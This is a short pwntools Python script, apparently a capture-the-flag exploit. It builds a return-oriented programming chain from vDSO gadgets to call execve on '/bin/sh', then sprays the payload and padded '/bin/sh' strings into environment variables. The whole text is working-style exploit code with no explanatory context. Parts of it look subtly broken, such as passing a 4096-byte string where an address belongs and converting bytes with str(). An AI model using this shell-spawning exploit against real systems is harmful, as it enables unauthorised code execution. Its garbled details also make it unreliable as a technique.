from pwn import *; import os; vDSO_base=0xf7ffc000; syscall_addr=vDSO_base+0x00000577; pop_ebx_esi_ebp=vDSO_base+0x00001aad; pop_edx_ecx=vDSO_base+0x0000057a; pop_eax=0x8048074; bin_sh_chain_4000=b"/"*(0x1000-len("bin/sh"))+b"bin/sh"; bin_sh_addr=0xff9cd590; garbage=0xdeadbeef; payload1=flat(pop_ebx_esi_ebp,bin_sh_chain_4000,bin_sh_addr,garbage,garbage,pop_edx_ecx,0x0,0x0); payload2=flat(pop_eax,0x0b,syscall_addr); payload3=flat(bin_sh_chain_4000); final_payload=payload1+payload2; os.environ['PWN']=str(final_payload); [os.environ.update({f'payload_3_{i}': f'{payload3}_{i}'}) for i in range(1, 101)]
